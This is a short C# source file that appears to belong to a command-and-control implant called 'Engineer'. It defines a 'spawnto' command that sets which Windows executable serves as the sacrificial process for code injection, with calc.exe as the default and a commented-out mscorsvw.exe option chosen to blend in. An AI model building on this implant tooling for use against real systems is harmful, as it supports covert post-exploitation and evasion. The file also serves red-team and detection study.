using Engineer.Commands;
using Engineer.Models;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Engineer.Commands
{
    internal class SpawnTo : EngineerCommand
    {
        public override string Name => "spawnto";
       // public static string spawnToPath = @"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\mscorsvw.exe";
        public static string spawnToPath = @"C:\Windows\System32\calc.exe";
        public override string Execute(EngineerTask task)
        {
             if (task.Arguments.TryGetValue("/path", out string path))
                {
                spawnToPath = path.TrimStart(' ');
                return "SpawnTo Path Set as " + spawnToPath;
                }
            return "error: " + "SpawnTo Path Not Set using default";
        }
    }
}
